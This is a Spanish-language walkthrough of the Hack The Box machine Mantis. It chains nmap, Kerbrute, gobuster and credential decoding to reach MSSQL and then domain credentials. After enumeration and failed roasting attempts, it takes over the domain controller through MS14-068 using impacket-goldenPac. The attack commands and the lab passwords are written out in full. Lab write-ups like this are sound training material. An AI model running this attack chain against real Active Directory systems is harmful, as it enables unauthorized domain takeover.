---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Mantis

`Mantis` puede ser sin duda una de las máquinas más desafiantes para algunos usuarios. Para explotarla con éxito, se requiere un poco de conocimiento o investigación sobre servidores Windows y el sistema de controlador de dominio.

<figure><img src="../../../../../.gitbook/assets/Mantis.png" alt="" width="563"><figcaption></figcaption></figure>

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Mantis**.

```bash
nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.52 -oG allPorts
```

<figure><img src="../../../../../.gitbook/assets/2613_vmware_uICK5584c1.png" alt="" width="563"><figcaption></figcaption></figure>

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX.

{% code overflow="wrap" %}
```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,49161,49166,49168,50255 10.10.10.52 -A -oN targeted -oX targetedXML
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/2613_vmware_uICK5584c1 (1).png" alt="" width="563"><figcaption></figcaption></figure>

Transformaremos el archivo XML obtenido en el resultado de **nmap** y lo transformaremos en un archivo HTML. Levantaremos un servidor HTTP con Python3.

```bash
xsltproc targetedXML > index.html

python3 -m http.server 80
```

<figure><img src="../../../../../.gitbook/assets/2614_vmware_xMg9Z6eQ3g.png" alt=""><figcaption></figcaption></figure>

Accederemos a[ http://localhost](http://localhost) y comprobaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../../../../.gitbook/assets/2615_vmware_9TQfsNvf6p.png" alt=""><figcaption></figcaption></figure>

Comprobaremos el nombre del dominio que nos enfrentamos, el nombre del equipo y que tipo de máquina nos enfrentamos.

```bash
netexec smb 10.10.10.52

ldapsearch -x -H ldap://10.10.10.52 -s base | grep defaultNamingContext
```

<figure><img src="../../../../../.gitbook/assets/2616_vmware_n9Na9vXyAN.png" alt=""><figcaption></figcaption></figure>

Procederemos a añadir la entrada en nuestro archivo **/etc/hosts**

```bash
catnp /etc/hosts | grep mantis.htb.local
```

<figure><img src="../../../../../.gitbook/assets/2617_vmware_osVj2vNjO7.png" alt=""><figcaption></figcaption></figure>

## Kerbrute User Enumeration

Procederemos a dejar en segundo plano la siguiente enumeración a través de Kerberos mediante fuerza bruta utilizando la herramienta de **Kerbrute**.

{% code overflow="wrap" %}
```bash
kerbrute userenum --dc 10.10.10.52 -d htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/2626_vmware_TkftybdHj6.png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

Revisando la existencia de diversos puertos, nos fijaremos en los siguientes puertos para realizar una enumeración de posibles directorios o subdirectorios en posibles páginas web de los siguientes puertos.

```bash
catnp targeted -l java | grep http | grep tcp
```

<figure><img src="../../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Procederemos a enumerar directorios a través de **gobuster** del puerto 1337 y nos encontramos que hay un directorio llamado "secure\_notes".

{% code overflow="wrap" %}
```bash
gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/2618_vmware_FWivlGgQim.png" alt=""><figcaption></figcaption></figure>

Accediendo a [http://10.10.10.52:1337/secure\_notes/](http://10.10.10.52:1337/secure_notes/) nos aparecen dos archivos, procederemos a comprobar que contiene el archivo .txt.

<figure><img src="../../../../../.gitbook/assets/2619_vmware_gxDJKAasVa.png" alt=""><figcaption></figcaption></figure>

Revisando el contenido del archivo (.txt) aparece un mensaje indicando que unos pasos donde se informa de crear un usuario llamado "admin" para la BBDD llamada "orchardb".

Revisando el nombre del archivo .txt nos fijamos en que parece una cadena codificada en Base64.

<figure><img src="../../../../../.gitbook/assets/2620_vmware_BHIE0yBzLu (1).png" alt=""><figcaption></figcaption></figure>

Probando de descodificar el posible contenido de Base64, nos damos cuenta que el resultado que nos muestra parece una codificación en Hexadecimal. Descodificamos en Hexacedcimal y verificamos el contenido del mensaje en texto plano, al parecer se trata de una contraseña, muy probablemente la del usuario de la BBDD.

```bash
echo 'NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx' | base64 -d; echo

echo '6d2424716c5f53405f504073735730726421' | xxd -r -p; echo
```

<figure><img src="../../../../../.gitbook/assets/2621_vmware_1xKWutcead.png" alt=""><figcaption></figcaption></figure>

## Database Enumeration (Dbeaver)

Procederemos a intentar conectarnos mediante la herramienta de **mssqlclient.py** y comprobamos que efectivamente ganamos acceso con el usuario "admin" y las credenciales encontradas.

```bash
mssqlclient.py htb.local/admin@10.10.10.52 2>/dev/null
```

<figure><img src="../../../../../.gitbook/assets/2622_vmware_vfgvZ25XiE.png" alt=""><figcaption></figcaption></figure>

En este caso, no realizaremos la enumeración de la base de datos a través de línea de comandos. En esta ocasión procederemos a hacer el uso de la herramienta de **Dbeaver** que permite conectarse a cualquier tipo de base de datos y poder realizar una enumeración con un entorno gráfico.

Abriremos la aplicación de **Dbeaver**, seleccionaremos el tipo de BBDD al cual queremos conectarnos, en este caso, escogemos el Microsoft SQL Server.

Especificaremos el usuario "admin" y las credenciales encontradas y la dirección IP del Host (10.10.10.52).

<figure><img src="../../../../../.gitbook/assets/2624_vmware_OKOZEq4JtF.png" alt="" width="551"><figcaption></figcaption></figure>

Revisando las tablas de la base de datos nombrada "orchardb", nos encontramos una tabla llamada "blog\_Orchard\_Users\_UserPartRecord". Probaremos de acceder a ella para ver el contenido de la misma.

<figure><img src="../../../../../.gitbook/assets/2623_vmware_AK83QZZJ9J.png" alt=""><figcaption></figcaption></figure>

Revisando el contenido de la tabla, nos damos cuenta que aparece la contraseña en texto plano de un usuario que al parecer es del dominio. Si bien recordamos, este usuario (james@htb.local) lo validamos anteriormente con **Kerbrute**, por lo tanto sabemos que es un usuario válido del dominio.

<figure><img src="../../../../../.gitbook/assets/2625_vmware_FnkSQ0MHc4.png" alt=""><figcaption></figcaption></figure>

Procederemos a validar si la contraseña es válida para el usuario (james@htb.local). Efectivamente comprobamos que si son credenciales válidas.

```bash
netexec smb 10.10.10.52 -u 'james' -p 'J@m3s_P@ssW0rd!'
```

<figure><img src="../../../../../.gitbook/assets/2627_vmware_CSVJeR0OHM.png" alt=""><figcaption></figcaption></figure>

## SMB Enumeration

Ya que disponemos de credenciales válidas, procederemos a intentar enumerar el SMB en busca de recursos compartidos que nos puedan aportar información interesante.

En este caso, los recursos enumerados no nos sirven para nada.

```bash
netexec smb 10.10.10.52 -u 'james' -p 'J@m3s_P@ssW0rd!' --shares
```

<figure><img src="../../../../../.gitbook/assets/2671_vmware_IG0ySu30D5.png" alt=""><figcaption></figcaption></figure>

## Users Enumeration (rpcenum)

Procederemos a enumerar el dominio a través del protocolo RPC con la herramienta de [**rpcenum**](https://github.com/s4vitar/rpcenum).

Comprobamos que hemos podido enumerar toda la lista de usuarios del dominio, nos guardaremos los usuarios en un archivo "users.txt".

```bash
rpcenum -e DUsers -i 10.10.10.52 -u 'james' -p 'J@m3s_P@ssW0rd!'
```

<figure><img src="../../../../../.gitbook/assets/2668_vmware_YG1uHpHRBA.png" alt="" width="415"><figcaption></figcaption></figure>

## AS-REP Roast Attack (GetNPUsers) - \[FAILED]

Dado que disponemos de los usuarios válidos del dominio, procederemos a realizar un **AS-REP Roast Attack** para solicitar un TGT (Ticket Granting Ticket) para aquellos usuarios que dispongan del (DONT\_REQ\_PREAUTH) de Kerberos y así obtener su hash y posteriormente crackearlo de manera offline.

En este caso, no encontramos ningún usuario que cumpla el requisito.

```bash
catnp users.txt

impacket-GetNPUsers -no-pass -usersfile users.txt htb.local/ 2>/dev/nul
```

<figure><img src="../../../../../.gitbook/assets/2669_vmware_mtkenHTWoH.png" alt="" width="553"><figcaption></figcaption></figure>

## Kerberoasting attack (GetUserSPNs) - \[FAILED]

Debido que disponemos de credenciales de un usuario válido del dominio, nos plantearemos en realizar un **Kerberoasting Attack** para solicitar un TGS (Ticket Granting Service) para obtener un hash y posteriormente crackearlo.

En este caso, tampoco obtenemos ningún resultado.

```bash
impacket-GetUserSPNs -dc-ip 10.10.10.52 htb.local/james -request 2>/dev/null
```

<figure><img src="../../../../../.gitbook/assets/2670_vmware_dgEWjFxFPn.png" alt=""><figcaption></figcaption></figure>

## BloodHound Enumeration

Realizaremos una enumeración con **BloodHound** a través de **bloodhound-python.**

{% code overflow="wrap" %}
```bash
bloodhound-python -c All -ns 10.10.10.52 -u 'james' -p 'J@m3s_P@ssW0rd!' -d htb.local --zip
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/2664_vmware_KDcom4FYav.png" alt=""><figcaption></figcaption></figure>

Revisando en el **BloodHound** en busca de vectores para elevar nuestros privilegios, nos damos cuenta que el usuario que disponemos (james@htb.local) dispone de permisos de **CanRDP** sobre el Domain Controller.

Pero si recordamos en la enumeración de puertos abiertos a través de Nmap, no se encontraban expuestos los puertos del RDP (3389) ni el del WinRM (5985), por lo tanto no nos podemos conectar remotamente.

<figure><img src="../../../../../.gitbook/assets/2665_vmware_plVOvhSgRg.png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Exploiting MS14-068 (goldenPac) \[Microsoft Kerberos Checksum Validation Vulnerability]

Dado que no encontramos ninguna manera de explotar una escala de privilegios, revisando en [https://swisskyrepo.github.io](https://swisskyrepo.github.io) posibles vectores de ataque al Active Directory, nos encontramos con la siguiente página que habla de la explotación del **MS14-068.**

[https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/MS14-068/](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/MS14-068/)

La vulnerabilidad MS14-068 permite a un atacante manipular el token de inicio de sesión Kerberos de un usuario legítimo para reclamar falsamente privilegios elevados, como ser un Administrador de Dominio. Esta reclamación falsa es validada erróneamente por el Controlador de Dominio, lo que permite el acceso no autorizado a los recursos de la red en todo el bosque de Active Directory.

En este caso, para explotar la vulnerabilidad, deberemos de añadir la entrada correspondiente al nombre del DC en el archivo **/etc/hosts** para asegurar una correcta resolución DNS.

```bash
catnp /etc/hosts | grep mantis.htb.local
```

<figure><img src="../../../../../.gitbook/assets/2666_vmware_kvsdXdLIpI.png" alt=""><figcaption></figcaption></figure>

Realizando el ataque a través de **impacket-goldenPac** utilizando la dirección IP del DC comprovamos que nos devuelve error, en cambio a través del nombre DNS del dc logramos explotar la vulnerabilidad y conseguir el acceso como _NT AUTHORITY\SYSTEM_.&#x20;

Esto debido a que Kerberos depende de nombres DNS para validar correctamente los tickets emitidos. Al usar la IP, la autenticación falla porque no coincide con el nombre esperado en el servicio Kerberos.

Una vez teniendo acceso al DC con los máximos privilegios, verificamos la flag de **user.txt** y la de **root.txt**.

```bash
impacket-goldenPac htb.local/james@10.10.10.52 2>/dev/null

impacket-goldenPac htb.local/james@mantis 2>/dev/null
```

<figure><img src="../../../../../.gitbook/assets/2667_vmware_rN3dv5p7ox.png" alt=""><figcaption></figcaption></figure>
